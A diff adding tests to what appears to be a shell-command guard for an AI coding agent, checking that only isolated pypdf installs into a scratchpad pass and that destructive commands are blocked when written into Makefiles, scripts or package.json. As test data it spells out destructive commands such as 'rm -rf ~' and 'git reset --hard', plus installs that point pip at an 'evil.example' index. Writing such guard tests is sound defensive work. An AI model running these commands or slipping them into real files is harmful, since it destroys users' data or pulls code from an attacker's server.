@@ -76,6 +76,38 @@ test('blocks package installs across ecosystems, and only installs', () => {
   }
 });
 
+test('lets pypdf into an isolated scratchpad --target through, and nothing else', () => {
+  const scratch = '/home/u/scratchpad/pylib';
+  for (const cmd of [
+    `pip install --isolated --target ${scratch} pypdf`,
+    `python3 -m pip install -q --isolated --target ${scratch} pypdf==4.3.1`,
+    // A path with a space, quoted, and a home-relative one.
+    'pip3 install --isolated --target "/Users/a b/scratchpad/pylib" pypdf',
+    'pip install --isolated --target ~/scratchpad/pylib pypdf',
+    // pip in isolated mode ignores PIP_* variables, so the prefix cannot redirect the index.
+    `PIP_INDEX_URL=http://evil.example pip install --isolated --target ${scratch} pypdf`,
+  ]) {
+    allows(shell(cmd), cmd);
+  }
+  for (const cmd of [
+    'pip install pypdf',
+    `pip install --target ${scratch} pypdf`,
+    `pip install --isolated --target ${scratch} requests`,
+    `pip install --isolated --target ${scratch} pypdf requests`,
+    `pip install --isolated --target ${scratch} -r requirements.txt pypdf`,
+    `pip install --isolated -i http://evil.example --target ${scratch} pypdf`,
+    `pip install --isolated --target=${scratch} pypdf`,
+    `uv pip install --isolated --target ${scratch} pypdf`,
+    'pip install --isolated --target /tmp/x pypdf',
+    'pip install --isolated --target /opt/scratchpad-not pypdf',
+    'pip install --isolated --target $S/scratchpad/lib pypdf',
+    'pip install --isolated --target ~/.claude/plugins/scratchpad pypdf',
+    `pip install --isolated --target ${path.join(os.homedir(), '.claude', 'plugins', 'scratchpad')} pypdf`,
+  ]) {
+    denies(shell(cmd), cmd);
+  }
+});
+
 test('anchors patterns at segment start, so quoted text is not a command', () => {
   allows(shell('echo "npm install"'), 'npm install inside an echo string');
   allows(shell('grep -r "pip install" docs/'), 'pip install inside a grep pattern');
@@ -138,6 +170,22 @@ test('blocks reads of credential files but not their committed examples', () => 
 test('blocks staging a credential file', () => {
   denies(shell('git add .env'), 'git add .env');
   allows(shell('git add src/index.js'), 'git add a source file');
+});
+
+test('blocks a destructive command written into a runner file, not into prose', () => {
+  denies(write('Makefile', 'nuke:\n\trm -rf ~'), 'Makefile target running rm -rf ~');
+  denies(write('scripts/x.sh', '#!/bin/sh\ngit reset --hard'), 'shell script running git reset --hard');
+  denies(write('package.json', '{"scripts":{"nuke":"rm -rf /"}}'), 'npm script running rm -rf /');
+  denies(write('build.ps1', 'Remove-Item -Recurse -Force ~'), 'PowerShell script deleting home');
+  denies(shell("printf 'nuke:\\n\\trm -rf ~' > Makefile"), 'printf payload redirected into a Makefile');
+  denies(shell('echo "rm -rf ~" | tee -a scripts/x.sh'), 'echo payload teed into a script');
+  denies(shell("cat > Makefile <<'EOF'\nnuke:\n\trm -rf ~\nEOF"), 'heredoc payload into a Makefile');
+  denies(shell("echo ok > Makefile && printf 'all:\\n\\trm -rf ~' >> Makefile"), 'payload behind a second redirect');
+  allows(write('Makefile', 'clean:\n\trm -rf ./build'), 'Makefile deleting its own build dir');
+  allows(write('Makefile', 'nuke:\n\techo would-delete'), 'Makefile with an inert stand-in');
+  allows(write('README.md', 'never run `rm -rf ~` by hand'), 'prose quoting the command');
+  allows(write('notes.txt', 'rm -rf ~'), 'a prose-named file (documented gap)');
+  allows(shell("printf 'nuke:\\n\\techo would-delete' > Makefile"), 'inert payload redirected into a Makefile');
 });
 
 test('blocks writes that introduce a secret', () => {
